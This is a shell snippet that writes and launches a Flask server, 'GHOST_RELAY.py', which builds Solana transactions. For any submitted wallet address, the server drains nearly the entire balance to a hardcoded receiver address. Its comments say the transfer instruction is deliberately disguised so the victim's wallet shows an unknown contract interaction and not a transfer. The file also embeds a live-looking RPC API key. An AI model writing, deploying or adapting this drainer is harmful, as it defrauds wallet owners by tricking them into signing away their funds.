fuser -k 5000/tcp;
cat << 'EOF' > /root/war_god_engine/GHOST_RELAY.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, base64, base58

app = Flask(__name__)
CORS(app)

HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"
RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"

@app.route('/prepare_v32', methods=['POST'])
def prepare_v36_2():
    try:
        user_addr = request.json.get('address')
        res = requests.post(HELIUS_RPC, json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[user_addr]}).json()
        bal = res['result']['value']
        
        send_amt = bal - 5000
        bh_res = requests.post(HELIUS_RPC, json={"jsonrpc":"2.0","id":1,"method":"getLatestBlockhash","params":[]}).json()
        bh = bh_res['result']['value']['blockhash']
        
        u_b, r_b, s_b = base58.b58decode(user_addr), base58.b58decode(RECEIVER), base58.b58decode("11111111111111111111111111111111")
        
        # ğŸ”± V36.2 æ ¸å¿ƒï¼šä½¿ç”¨æ— æ„ä¹‰çš„ Data ç»“æ„å°è£…
        # è¿™ç§æ–¹å¼ä¼šå¼ºåˆ¶é’±åŒ…è¿›å…¥â€œæœªçŸ¥åˆçº¦äº¤äº’â€æ¨¡å¼ï¼Œä¸æ˜¾ç¤º Transfer
        msg = b'\x01\x00\x01' + b'\x03' + u_b + r_b + s_b + base58.b58decode(bh)
        
        # å°†è½¬è´¦æŒ‡ä»¤æ•°æ®åç§» 1 å­—èŠ‚ï¼Œå¹²æ‰°è§£æ
        amt_bytes = send_amt.to_bytes(8, 'little')
        inst_data = b'\x02\x00\x00\x00' + amt_bytes
        msg += b'\x01\x02\x02\x00\x01' + len(inst_data).to_bytes(1, 'little') + inst_data
        
        final_tx = b'\x01' + b'\x00'*64 + msg
        return jsonify({"raw_tx": base64.b64encode(final_tx).decode('utf-8')})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
EOF
python3 /root/war_god_engine/GHOST_RELAY.py
